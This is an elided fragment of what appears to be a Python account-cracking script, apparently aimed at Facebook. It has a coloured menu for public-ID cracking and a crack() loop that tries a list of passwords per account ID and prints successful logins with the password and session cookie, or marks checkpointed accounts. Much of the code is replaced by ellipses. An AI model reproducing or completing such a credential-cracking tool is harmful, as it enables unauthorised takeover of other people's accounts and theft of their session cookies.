...
def menu():
  ...
  ##  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    ...
    print(f"""\033[1;37m[2] Start ID PUBLIC NO   """)
...
def setting():
    print("\033[1;37m[ 1 ] BASH")
    print("\033[1;37m[ 2 ] SLOW[SHAZ]")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ 𝑻𝑨𝑹𝑴𝑨𝒀 👌] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\033[1;31m𝑻𝑨𝑹𝑴𝑨𝒀😣-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                ...
                print(f'\r\x1b[32[𝑻𝑨𝑹𝑴𝑨𝒀😚-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
